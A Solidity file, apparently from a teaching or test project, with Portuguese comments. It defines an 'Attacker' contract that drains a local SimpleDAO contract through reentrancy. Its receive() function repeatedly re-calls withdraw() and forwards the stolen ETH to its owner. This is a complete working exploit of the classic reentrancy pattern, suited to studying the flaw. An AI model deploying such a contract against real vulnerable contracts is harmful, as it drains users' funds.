// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../src/SimpleDAO.sol";

/// @notice Contrato que explora o bug de reentrancy da SimpleDAO
contract Attacker {
    SimpleDAO public dao;
    address public owner;
    bool internal attacking;

    constructor(address _dao) {
        dao = SimpleDAO(_dao);
        owner = msg.sender;
    }

    /// @notice Inicia o ataque: deposita na DAO e chama withdraw uma vez
    function attack() external payable {
        require(msg.sender == owner, "not owner");
        require(msg.value > 0, "need eth");

        // 1) Deposita na DAO usando este contrato como "usuário"
        dao.deposit{value: msg.value}();

        // 2) Inicia o primeiro saque -> dispara o receive() abaixo
        dao.withdraw();
    }

    /// @notice Fallback/receive chamado toda vez que a DAO manda ETH
    receive() external payable {
        // Enquanto ainda tiver saldo na DAO, reentra
        uint256 daoBalance = address(dao).balance;

        if (daoBalance >= 1 ether) {
            // Reentra chamando withdraw de novo, usando o mesmo saldo mapeado
            dao.withdraw();
        } else {
            // Quando já drenou quase tudo, manda o dinheiro pro EOA dono
            payable(owner).transfer(address(this).balance);
        }
    }
}
